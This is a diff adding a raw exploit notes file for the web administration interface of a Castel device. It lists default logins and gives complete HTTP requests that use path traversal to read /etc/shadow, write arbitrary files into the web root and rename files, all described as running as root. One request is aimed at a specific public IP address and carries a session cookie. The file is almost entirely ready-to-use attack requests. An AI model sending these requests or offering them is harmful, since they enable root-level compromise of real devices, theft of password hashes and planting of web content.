@@ -1,0 +1,88 @@
+#Default password
+
+admin:admin
+castel:castel
+
+#Arbitrary File Read (As Root)
+
+POST /castel-cfg/cgi-bin/webgip.cgi HTTP/1.1
+Host: XX:X
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
+Accept: */*
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 550
+DNT: 1
+Connection: keep-alive
+Cookie: SessId=XX; UserLogin=admin; user_lang=en
+
+
+protocol=2&page=35&mode=21&lang=en&bt=45&gid=&fichier_a_envoyer_type=&fichier_a_telecharger_supprimer_type=8&fichier_a_envoyer_selection=
+&fichier_a_envoyer_nom=&fichier_a_telecharger_supprimer_audio=&fichier_a_telecharger_supprimer_image=&fichier_a_telecharger_supprimer_certificat=
+&fichier_a_telecharger_supprimer_mib=../../../../../etc/shadow&fichier_a_renommer_type=&fichier_a_renommer_audio=&fichier_a_renommer_image=
+&fichier_a_renommer_certificat=&fichier_a_renommer_mib=&fichier_nouveau_nom=&file_type=8&file_action=1&file_list=meh&file_name=
+
+
+#Arbitrary File Write (As Root) will save the file as $name.png use rename
+
+POST /castel-cfg/cgi-bin/req_put_resource.cgi HTTP/1.1
+Host: XX:x
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
+Accept: */*
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------11111950042175410243039991474
+Content-Length: 561
+DNT: 1
+Connection: close
+Cookie: SessId=XX; UserLogin=admin; user_lang=en
+
+-----------------------------11111950042175410243039991474
+Content-Disposition: form-data; name="resource-type"
+
+512
+-----------------------------11111950042175410243039991474
+Content-Disposition: form-data; name="file_name"
+
+../../../../../../../usr/lighttpd/www/meh
+-----------------------------11111950042175410243039991474
+Content-Disposition: form-data; name="file"; filename="../../../../../../../usr/lighttpd/www/meh"
+Content-Type: text
+
+CONTENT
+
+
+-----------------------------11111950042175410243039991474--
+
+#Aritrary File Rename (As Root) 
+
+POST /castel-cfg/cgi-bin/webgip.cgi HTTP/1.1
+Host: 91.211.66.10:5443
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 588
+Origin: https://91.211.66.10:5443
+DNT: 1
+Connection: close
+Referer: https://91.211.66.10:5443/castel-cfg/gip2.html
+Cookie: SessId=1613569922; UserLogin=admin; user_lang=en
+
+protocol=2&page=35&mode=21&lang=en&bt=54&gid=&fichier_a_envoyer_type=&fichier_a_telecharger_supprimer_type=&fichier_a_envoyer_selection=
+&fichier_a_envoyer_nom=&fichier_a_telecharger_supprimer_audio=&fichier_a_telecharger_supprimer_image=&fichier_a_telecharger_supprimer_certificat=
+&fichier_a_telecharger_supprimer_mib=&fichier_a_renommer_type=8&fichier_a_renommer_audio=&fichier_a_renommer_image=&fichier_a_renommer_certificat=
+&fichier_a_renommer_mib=../../../../../../../usr/lighttpd/www/meh.png&fichier_nouveau_nom=../../../../../../../usr/lighttpd/www/meh&file_type=8
+&file_action=2&file_list=&file_name=
+
+#WEB ROOT : /usr/lighttpd/www
+
+#Interesting files : 
+
+/usr/lighttpd/www/castel-cfg/cgi-bin/webgip.cgi (Compiled need to be reversed)
+
